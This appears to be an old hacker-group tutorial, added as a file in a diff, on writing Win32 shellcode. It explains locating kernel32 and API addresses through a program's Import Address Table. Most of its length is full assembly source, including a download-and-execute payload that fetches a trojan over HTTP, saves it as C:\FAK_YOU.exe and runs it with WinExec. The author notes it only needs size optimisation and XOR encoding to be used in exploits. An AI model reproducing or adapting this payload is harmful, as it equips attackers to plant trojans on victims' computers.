@@ -1,0 +1,636 @@
+
+	       ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+	   ÚÄÄÄ³ÄÄÄÄÄÄÄÄÄÄ[sec-labs.hack.pl]ÄÄÄÄÄÄÄ³ÄÄÄÄ¿
+	   ³                                            ³
+	   ³ Technological Step Into Win32 Shellcodes   ³
+	   ³                                            ³
+	   ÀÄÄÄÄÄÄÄÄÄÄÄ´    wRiTtEn bY     ÚÄÄÄÄÄÄÄÄÄÄÄÄÙ
+	     ÀÄÄÄÄÄÄÄÄÁ[l0rd yup / sec-labs]ÙÄÄÄÄÄÄÄÄÙ
+			         TKT ^ TKT
+
+
+
+	Ú---úú  .
+	| Index |
+	`  úú--ÄÙ
+
+ !1.  Known win32 shellcodes - little overview
+ !2.  "IAT-S" (Import Address Table Shellcodes)
+  2.1	 What's IAT?
+  2.2  Grabbing KERNEL address using IAT
+  2.3  Receiving API addresses
+ !3.  Trojanize shellcodes - downloading trojans (from http/ftp servers)
+  3.1  Known methods
+  3.2  Using Microsoft Win32 Internet Functions
+  3.2a  Whats MS-W32-IF?
+  3.2b  Downloading trojan from HTTP + example
+ !4.  Pseudo-shellcode - why not full!?
+ !5.  Contact
+
+
+
+
+:- !1. Known win32 shellcodes - little overview
+	
+	So here the story starts ;D Everybody knows that win32 shellcodes are
+	more complex and much bigger then unix based shellcodes. 
+	This is documented in some articles on net so run and read it X-D
+	
+	I've found one shellcode from 6 that is using some kind of IAT method, 
+        the pseudo-winner is "plug&play WinNT/2k remote shellcode" by DeepZone 
+	the only problem is that it's coder didn't know that his little sploit
+	faults after telnet connection and used the easiest way to receive API 
+	and kernel address - he was scanning only for indirect jumps. (the byte 
+	scanning method is bad since every compiler use different structure - 
+	try to compare tasm32 linked file (borland corp) with msvc file - and 
+	what can you see? ;))
+
+	NOTE: Today after short conversation with BFFh i heard that many shellcodes
+	      with IAT method inside exists - so it's only an honour to finish this
+	      article.
+
+	The other 6 ones, thet haven't used any pseudo IAT method, in this case
+	must use hardcoded kernel address + SEH (u know exeception handling) or 
+	second option: memory scanning also + SEH. Why these Pretty old techniques 
+	are so common nowadays? - it isn't the best way!
+
+:- !2.  "IAT-S" (Import Address Table Shellcodes)
+    2.1  What's IAT?
+
+	Well, let's reference to microsoft guy (PE format is really funny)
+	"The Import Address Table (IAT) is an array of addresses of the imported
+    	routines for each DLL. The last entry is empty (NULL) which indicates
+    	the end of the table."
+
+	Let's compare some windows files: 
+	(i will only note imports which can be usefull in our shellcode)	
+
+	1) G6FTPSRV.EXE (packed by aspack - juck! ;D)
+		Image base               00400000
+		Imports from kernel32.dll
+    			GetProcAddress		- THIS ONE CAN BE FOUND IN IAT ;)
+		    	GetModuleHandleA	- this ...
+			LoadLibraryA		- ... and this also ;D
+
+	Note that files packed by program like aspack/petite/upx always
+	are importing this 3 functionss ;) isn't it nice? Ok let's try 
+	some IIS file X-D
+
+	2) INETINFO.EXE
+		Image base               01000000
+		Imports from KERNEL32.dll
+			GetProcAddress(hint = 0153)  - LOOK UP! ;]
+			LoadLibraryA(hint = 01df)
+			GetModuleHandleA(hint = 013a)
+
+
+	And may be one more, hmm lets try warftp-d ;D
+
+	3) WDM.EXE
+		Image base               00400000
+		Imports from KERNEL32.dll
+			LoadLibraryA(hint = 022e)    - X-D
+			GetModuleHandleA(hint = 0167)
+			GetProcAddress(hint = 0189)
+
+
+
+	As can you see, 99% of win32 applications have imported
+	those 3 functions.
+
+    2.2  Grabbing KERNEL address using IAT
+
+	Let's stop for a moment at this API function, LoadLibraryA.
+
+	The LoadLibrary function maps the specified executable module into
+	the address space of the calling process. 
+	HINSTANCE LoadLibrary(
+	    LPCTSTR lpLibFileName 	// address of filename of executable module 
+   	);
+  
+	So it's simply returing the address of specific library.
+	For example,
+
+	LoadLibraryA("KERNEL32.DLL") - returns BFF70000h on w98se
+				     - returns BFF60000h on winME
+				     - returns 77E80000h on w2k
+
+	As you can see, kernel address is different in every windows version.
+	
+	Ok... look at PE file specification, there is an entry called
+	Image base (as you probably knows it is the address where the PE
+ 	file is about to be mapped in memory) - LoadLibrary and common
+	functions will always return the value of Image base.
+
+        If you can't obtain software you want to exploit, IAT-shellcodes
+        may be hard to use, because you don't know Image base. 
+
+	(If you wanna know sth more about IAT structure read some PE format
+	specfication)
+
+	Ok Let's grab some function:
+
+    ;------------------------cut here---------------------------------------------
+    ;following example searches for "GetModuleHandleA" or "LoadLibraryA"
+    ;and then it obtains kernel address
+    ;compile: (very unoptimised version)
+    ;	tasm32 /m1 /m3 /mx iat,,;
+    ;	tlink32 -Tpe -aa iat,iat,,import32.lib,,
+    ; pewrsec iat.exe
+    ;-----------------------------------------------------------------------------	
+
+    .386                             ;la la la 
+    .model flat
+
+				     ;this will be stored in IAT
+    extrn AddAtomA:PROC              ;for testing only
+    ;extrn GetModuleHandleA:PROC     ;SELECT YOUR
+    extern LoadLibraryA:PROC         ;PLAYER ;] 
+
+    callx macro x                    ;only for this  
+    extrn x:proc                     ;example ;]
+    call x
+    endm
+
+    .data
+    db "go home...",0
+
+    .code
+    iat_start:
+
+    call iat_delta
+    iat_delta: pop ebp
+               sub ebp,offset iat_delta
+
+
+    mov eax,dword ptr [ebp+imagebase]
+    add eax,[eax+3ch]                     ;get PE header ;]
+
+    mov edi,[eax+80h]                     ;import table
+    add edi,dword ptr [ebp+imagebase]
+
+
+    iat_loop:
+    cmp dword ptr [edi],0
+    je exit
+
+    check_it:
+    mov edx,[edi]                          ;ID_OriginalFirstThunk=POINTER TO ASCII A.
+    add edx,dword ptr [ebp+imagebase]       
+    mov eax,[edi+10h]                      ;ID_FirstThunk=POINTER TO ADDR ARRAY
+    add eax,dword ptr [ebp+imagebase]
+
+
+    loop_iat: 
+    mov ecx,[edx]                          ;ordinal
+    add ecx,dword ptr [ebp+imagebase]
+    add ecx,2                              ;ecx points to API name   
+
+    cmp dword ptr [ecx],'MteG'             ;is this GetModuleHandle?
+    jne next__
+    cmp dword ptr [ecx+4],'ludo'
+    jne next__ 
+
+
+    near_jump:                             ;if yes
+    mov eax,[eax]
+    lea ebx,[ebp+kernel]
+    push ebx
+    call eax                               ;execute function!!!
+    mov dword ptr [ebp+kernel_addr],eax    ;store kernel address
+    int 3                                  ;bang bang you are dead!!!
+    jmp exit                               ;out ...
+
+    next__:
+    cmp dword ptr [ecx],'daoL'             ;mhhh LoadLibraryA???
+    jne next_
+    cmp dword ptr [ecx+4],'rbiL'
+    je near_jump                           ;probablly, execute!  
+
+
+    next_:                                 ;search !
+    
+    add edx,4
+    add eax,4
+    jmp loop_iat
+
+    exit: push 0
+          callx ExitProcess                ;out ;]
+
+
+    ;-=-=-=-=-=-=-=-=data-=-=-=-=-=-=-=-=
+    imagebase 	  dd 0400000h            ;u should know this value
+
+    kernel          db "KERNEL32.DLL",0    ;kernel
+    kernel_addr     dd 0 
+
+    end iat_start
+
+    ;------------------------cut here---------------------------------------------
+  	
+
+    2.3  Receiving API addresses
+
+        We have already built a KERNEL32.DLL adress finder, but how to obtain
+	api addr? There are two ways: we can read KERNEL32.DLL export section,
+	or obtain GetProcAddress API. Since this article is about IAT we will
+	use second method. We will just re-build our previous procedure so it
+	will find LoadLibraryA (not for GetModuleHandleA) and GetProcAddress.
+	If we obtain KERNEL address, we can execute GetProcAddress as follows:
+	GetProcAddress(kernel_addr, "IM_A_CRAZY_API_FUNCTION");
+
+:- !3.  Trojanize shellcodes - downloading trojans (from http/ftp servers)
+    3.1  Known methods
+
+
+	As you probably know there are two types of shellcodes (most common),
+	binding shell to some port and trojan(backdoors) downloading shellcodes.
+        In this chapter we will try to download trojan file using wininet library
+	and HTTP/FTP protocols.
+
+    3.2  Using Microsoft Win32 Internet Functions
+     3.2a  Whats MS-W32-IF?
+
+        Ah again quotation, hope that clears everything:
+	"The Microsoft Win32 Internet (WinInet) API provides stand-alone applications
+	with easy access to standard Internet protocols such as Gopher, FTP, and HTTP, 
+	abstracting the protocols into a high-level interface that is familiar to Win32
+	developers. See the Microsoft Win32 Internet Functions Reference for descriptions
+	of the individual functions."
+
+	The easiest way - no need to use sockets :D
+
+     3.2b  Downloading trojan from HTTP + example
+
+	Ok so let's now try to obtain file from HTTP...
+
+        Look at the following example cut from pseudo-shellcode:
+	
+    ;------------------------cut here---------------------------------------------
+    ;note this function downloads file from http server, stores it a c:\FAK_YOU.exe
+    ;and then runs it	
+    ;not optimised version ;/
+
+	HTTP_REQUEST equ "http://127.0.0.1/trojan.exe",0
+
+	download_file:
+	push 0
+	push 0
+	push 0
+	push 1	;INTERNET_OPEN_TYPE_DIRECT
+	@pushsz "e"					;client? ;]
+	call dword ptr [ebp+_InternetOpen]		;create an internet handle X-D
+	mov ebx,eax					;handle to ebx
+
+
+	INTERNET_FLAG_RAW_DATA                  equ 40000000h
+
+	xor eax,eax
+	push eax
+	push INTERNET_FLAG_RAW_DATA
+	push eax
+	push eax
+	@pushsz HTTP_REQUEST				;our little HTTP request ;]
+	push ebx
+	call dword ptr [ebp+_InternetOpenUrl]		;make a connection to http server
+	mov ebx,eax					;handle to ebx
+
+	push 0
+	push 0
+	lea esi,[ebp+_bytes]
+	push esi						;pointer to bytes returned
+	push ebx
+	call dword ptr [ebp+_InternetQueryDataAvailable]	;receive trojan's size
+	mov edx,dword ptr [ebp+_bytes]				;to _bytes variable
+
+
+	mov eax,edx
+	push edx
+	inc eax
+	push eax
+	push GMEM_ZEROINIT or GMEM_FIXED	
+	call dword ptr [ebp+_GlobalAlloc]			;alloc enough memory X-D
+	mov edi,eax
+	pop edx
+
+	push edx
+	lea eax,[ebp+_GetProcAddress]				;use declared space ;][;
+	push eax
+	push edx						;trojan's size
+	push edi						;to edi (buffor allocated)
+	push ebx
+	call dword ptr [ebp+_InternetReadFile]			;download the trojan!
+
+
+	push 4
+	@pushsz "C:\FAK_YOU.exe"
+	call dword ptr [ebp+_lcreat]				;create the file with sys attrib
+	mov ebx,eax
+
+	push edi
+	push ebx
+	call dword ptr [ebp+_lwrite]				;write the trojan
+	
+	push ebx						;close the handle
+	call dword ptr [ebp+_lclose]
+
+	push 2
+	@pushsz "C:\FAK_YOU.exe"				;enter the filename (on tha stack=])
+	call dword ptr [ebp+_WinExec]				;execute!
+
+
+    ;------------------------cut here---------------------------------------------
+
+
+        There is no problem in rewriting it to use FTP.
+
+
+:-  Pseudo-shellcode - why not full!?
+
+	The answer is i don't have time to optimise the source, and even if 
+	i will finish with optimising it i want to keep it private.
+	I hope everybody with a litle x86 assembly knowledge will have no 
+	problems with building fully optimised win32 shellcode.
+	
+	Here comes the example then, it's heavy unoptimised like i said before,
+	it's not xored, and it's normal program, ok i made little listing what to do:
+	
+	: - must be optimised current size is sth about 560 bytes ;(
+	: - shellcode must be xored (no NULL chars, no CRLFs ;)) 
+	: - and that's all ;][;
+
+
+	
+    ;------------------------cut here---------------------------------------------
+
+
+
+
+    .386p
+    .model flat
+
+    extern ExitProcess:PROC
+    extern GetProcAddress:PROC
+    extern MessageBoxA:PROC
+    extern Beep:PROC
+    extern LoadLibraryA:PROC
+
+    include win32api.inc
+
+    HTTP_REQUEST 			equ 	"http://127.0.0.1/2.exe"
+    IMAGE_BASE				equ  	0400000h   
+
+
+
+    @pushsz macro string
+    local next
+    call next
+    db string,0
+    next:
+    endm
+
+
+
+
+    .data
+    db ?
+
+    .code
+
+
+    start:
+
+    iat_start:
+    call iat_delta
+    iat_delta: pop ebp
+               sub ebp,offset iat_delta
+
+
+    mov eax,IMAGE_BASE
+    mov edi,eax
+    push eax
+    add eax,[eax+3ch]                     ;get PE header ;]
+    add edi,[eax+80h]                     ;import table
+    pop ebx
+
+
+    iat_loop:
+    cmp dword ptr [edi],0
+    je exit_iat
+
+    check_it:
+    mov esi,[edi]                          ;ID_OriginalFirstThunk=POINTER TO ASCII A.
+    add esi,ebx     
+    mov edx,[edi+10h]                      ;ID_FirstThunk=POINTER TO ADDR ARRAY
+    add edx,ebx
+
+
+    loop_iat:
+    lodsd
+    test eax,eax
+    jz exit_iat
+
+
+    add eax,ebx
+    add eax,2                              ;esi points to API name   
+ 
+    cmp dword ptr [eax],'PteG'             ;is this GetProcAddress
+    jne next__
+    cmp dword ptr [eax+4],'Acor'
+    jne next__ 
+    mov eax,[edx]
+    mov dword ptr [ebp+_GetProcAddress],eax	
+	
+    jmp next_
+
+    near_jump:                             ;if yes
+    
+    mov eax,[edx]
+    mov dword ptr [ebp+_LoadLibraryA],eax
+
+	   
+
+    jmp next_
+    ;jmp exit                               ;out ...
+
+    next__:
+    cmp dword ptr [eax],'daoL'             ;mhhh LoadLibraryA???
+    jne next_
+    cmp dword ptr [eax+4],'rbiL'
+    je near_jump                           ;probablly, execute!  
+
+
+    next_:                                 ;search !
+    add edx,4
+    jmp loop_iat
+
+    exit_iat: 
+
+    iat_size=$-offset iat_start
+
+
+    start_shellcode:
+    lea edx,[ebp+wininet]
+    lea esi,[ebp+_API]
+
+    spank_it_up:
+    push edx
+    call dword ptr [ebp+_LoadLibraryA]
+    xchg ebx,eax
+
+
+
+    get_addr:
+    inc esi
+    push esi
+    push ebx
+    call dword ptr [ebp+_GetProcAddress]
+    mov [esi],eax
+
+
+    to_null:
+    cmp byte ptr [esi+2],'Y'
+    je get_from_kernel
+    inc esi
+
+    cmp byte ptr [esi],0
+    je get_addr
+    jmp to_null
+
+
+    get_from_kernel:
+    cmp byte ptr [ebp+temp],'Y'
+    je download_file
+
+    mov edi,ebx
+
+    lea edx,[ebp+kernel]
+    lea esi,[ebp+krnl]
+    mov byte ptr [ebp+temp],'Y'
+    jmp spank_it_up
+
+
+
+    download_file:
+    push 0
+    push 0
+    push 0
+    push 1	;INTERNET_OPEN_TYPE_DIRECT
+    @pushsz "e"
+    call dword ptr [ebp+_InternetOpen]
+    mov ebx,eax
+
+
+    INTERNET_FLAG_RAW_DATA                  equ 40000000h
+
+    xor eax,eax
+    push eax
+    push INTERNET_FLAG_RAW_DATA
+    push eax
+    push eax
+    @pushsz HTTP_REQUEST
+    push ebx
+    call dword ptr [ebp+_InternetOpenUrl]
+    mov ebx,eax
+
+
+
+    push 0
+    push 0
+    lea esi,[ebp+_bytes]
+    push esi
+    push ebx
+    call dword ptr [ebp+_InternetQueryDataAvailable]
+    mov edx,dword ptr [ebp+_bytes]
+
+
+    mov eax,edx
+    push edx
+    inc eax
+    push eax
+    push GMEM_ZEROINIT or GMEM_FIXED	
+    call dword ptr [ebp+_GlobalAlloc]
+    mov edi,eax
+    pop edx
+
+    push edx
+    lea eax,[ebp+_GetProcAddress]
+    push eax
+    push edx
+    push edi
+    push ebx
+    call dword ptr [ebp+_InternetReadFile]
+
+
+    push 4
+    @pushsz "C:\FAK_YOU.exe"
+    call dword ptr [ebp+_lcreat]
+    mov ebx,eax
+
+    push edi
+    push ebx
+    call dword ptr [ebp+_lwrite]
+
+    push ebx
+    call dword ptr [ebp+_lclose]
+
+    push 2
+    @pushsz "C:\FAK_YOU.exe"
+    call dword ptr [ebp+_WinExec]
+
+
+    exit:       push 0
+		call ExitProcess
+
+
+    _SPLOIT_DATA:
+
+    _GetProcAddress				dd  0	;BFF76DA8h
+    _LoadLibraryA				dd  0	;BFF776D0h
+    _bytes					dd  0
+
+    _WIN_INET:
+    wininet					db "WININET.DLL",0
+    kernel					db "KERNEL32.DLL",0
+
+    to_wininet=$-offset _WIN_INET
+    _API:
+	
+    temp					db 0
+    _InternetOpen				db "InternetOpenA",0
+    _InternetOpenUrl 				db "InternetOpenUrlA",0
+    _InternetQueryDataAvailable			db "InternetQueryDataAvailable",0
+    _InternetReadFile				db "InternetReadFile",0,'Y'
+
+    krnl:		
+						db 0
+    _GlobalAlloc				db "GlobalAlloc",0
+    _WinExec					db "WinExec",0
+    _lcreat					db "_lcreat",0
+    _lwrite					db "_lwrite",0
+    _lclose					db "_lclose",0
+						db 'Y'
+
+
+    shellcode_size=$-offset start	;022D=557 bytes022D
+
+    end start
+
+    ;------------------------cut here---------------------------------------------
+
+
+
+:- !5. Contact
+
+	Well, i hope that you found this article interesting. Thanks to mcbethh
+	for little grammar fixes :)
+	
+	If you have any questions, catch me at yup@tlen.pl or write mail to
+	team@sec-labs.hack.pl (http://sec-labs.hack.pl - download our public key).
+
+	Well that's all! Keep Fighting Man!
+
+	Greetz fliez to:
+	SEC-LABS, TKT, #phreakpl (ircnet), #virus (undernet), #asm (undernet)
+
+	EOF 
